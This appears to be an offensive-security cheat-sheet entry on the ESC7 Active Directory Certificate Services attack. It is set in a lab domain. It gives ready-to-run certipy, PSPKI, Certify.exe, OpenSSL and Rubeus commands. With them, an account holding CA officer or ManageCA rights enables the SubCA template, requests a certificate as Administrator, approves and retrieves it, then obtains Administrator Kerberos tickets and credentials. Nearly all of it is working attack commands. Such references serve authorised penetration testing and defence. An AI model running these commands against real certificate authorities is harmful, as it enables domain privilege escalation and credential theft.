# 13.10 ESC7 CA Officer Privileges

> Combine ManageCA + ManageCertificates — enable SubCA, request (deny), then issue + retrieve via `Certify.exe download`.

## Overview

ManageCA rights allow enabling templates and toggling EDITF_ATTRIBUTESUBJECTALTNAME2. ManageCertificates (CA officer) rights allow approving pending certificate requests. Combining both: enable SubCA template, request it (gets denied but saves a request ID + private key), then issue it, then retrieve it. From Windows, PSPKI's Get-CertificationAuthority pipeline enumerates and grants rights; Certify.exe download fetches the approved cert.

## Steps

- certipy find output shows ESC7 only if the scanning account itself has ManageCA or ManageCertificates rights
- With ManageCA: add ManageCertificates rights to yourself via certipy ca -add-officer
- Enable SubCA template via certipy ca -enable-template SubCA (or confirm already enabled)
- Request SubCA cert with -upn Administrator — request will be denied but saves request ID and private key
- Issue the request with certipy ca -issue-request <ID>, then retrieve with certipy req -retrieve <ID>
- Alternative (ManageCertificates only): find templates with Manager Approval required (e.g., ESC7_1), request → pending → issue → retrieve
- From Windows: PSPKI cmdlets enumerate/modify CA ACLs; Certify.exe request then Approve-CertificateRequest; Certify.exe download /id fetches cert

## Commands

### certipy ca enable SubCA

```bash
certipy ca -u 'blwasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -enable-template 'SubCA'
```

### certipy ca add-officer

```bash
certipy ca -u 'blwasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -add-officer BlWasp
```

### certipy req SubCA (will be denied, saves key)

```bash
certipy req -u 'blwasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -template SubCA -upn Administrator
```

### certipy ca issue-request

```bash
certipy ca -u 'blwasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -issue-request 31
```

### certipy req retrieve

```bash
certipy req -u 'blwasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -retrieve 31
```

### certipy req ESC7_1 (manager approval)

```bash
certipy req -u 'blwasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -template ESC7_1 -upn Administrator
```

### certipy ca issue ESC7_1

```bash
certipy ca -u 'blwasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -issue-request 59
```

### certipy req retrieve ESC7_1

```bash
certipy req -u 'blwasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -retrieve 59
```

### PSPKI enumerate CA ACL

```powershell
Get-CertificationAuthority -ComputerName LAB-DC.lab.local | Get-CertificationAuthorityAcl | select -ExpandProperty access
```

### PSPKI grant ManageCertificates

```powershell
Get-CertificationAuthority LAB-DC.LAB.LOCAL | Get-CertificationAuthorityAcl | Add-CertificationAuthorityAcl -Identity "blwasp" -AccessType Allow -AccessMask "ManageCertificates" | Set-CertificationAuthorityAcl -RestartCA
```

### Certify.exe request ESC7_1

```powershell
.\Certify.exe request /ca:LAB-DC\lab-LAB-DC-CA /template:ESC7_1 /altname:Administrator
```

### PSPKI get pending requests

```powershell
Get-CertificationAuthority -ComputerName LAB-DC.lab.local | Get-PendingRequest
```

### PSPKI approve pending request

```powershell
Get-CertificationAuthority -ComputerName LAB-DC.lab.local | Get-PendingRequest -RequestID 100 | Approve-CertificateRequest
```

### Certify.exe download

```powershell
.\Certify.exe download /ca:LAB-DC\lab-LAB-DC-CA /id:100
```

### OpenSSL convert approved

```powershell
& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in approved.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out approved.pfx
```

### Rubeus asktgt approved cert

```powershell
.\Rubeus.exe asktgt /user:administrator /certificate:approved.pfx /getcredentials
```
